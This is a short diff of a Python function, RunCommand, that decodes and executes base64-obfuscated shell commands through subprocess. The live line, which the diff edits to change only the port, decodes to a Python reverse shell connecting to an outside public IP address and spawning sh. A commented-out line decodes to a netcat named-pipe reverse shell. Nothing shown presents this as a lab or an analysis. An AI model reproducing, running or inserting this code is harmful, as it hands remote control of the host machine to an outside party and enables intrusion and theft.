@@ -14,7 +14,7 @@ def RunCommand():
     else:
         #cmd = 'base64 --decode <<< cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDE3Mi4xNi4xMTQuMTM2IDg4ODggPi90bXAvZg== | sh'
         #cmd = ['rm', '/tmp/f;mkfifo', '/tmp/f;cat', '/tmp/f|sh', '-i', '2>&1|nc', '172.16.114.136', '8888', '>/tmp/f']
-        cmd = 'echo ZXhwb3J0IFJIT1NUPSIxOC4yMTkuMTk4LjE0OCI7ZXhwb3J0IFJQT1JUPTg4ODg7cHl0aG9uMyAtYyAnaW1wb3J0IHN5cyxzb2NrZXQsb3MscHR5O3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgob3MuZ2V0ZW52KCJSSE9TVCIpLGludChvcy5nZXRlbnYoIlJQT1JUIikpKSk7W29zLmR1cDIocy5maWxlbm8oKSxmZCkgZm9yIGZkIGluICgwLDEsMildO3B0eS5zcGF3bigic2giKSc= | base64 --decode | sh'
+        cmd = 'echo ZXhwb3J0IFJIT1NUPSIxOC4yMTkuMTk4LjE0OCI7ZXhwb3J0IFJQT1JUPTUwMDA7cHl0aG9uMyAtYyAnaW1wb3J0IHN5cyxzb2NrZXQsb3MscHR5O3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgob3MuZ2V0ZW52KCJSSE9TVCIpLGludChvcy5nZXRlbnYoIlJQT1JUIikpKSk7W29zLmR1cDIocy5maWxlbm8oKSxmZCkgZm9yIGZkIGluICgwLDEsMildO3B0eS5zcGF3bigic2giKSc= | base64 --decode | sh'
         completed = subprocess.run(cmd, shell=True, capture_output=True, check=True)
     return completed
 
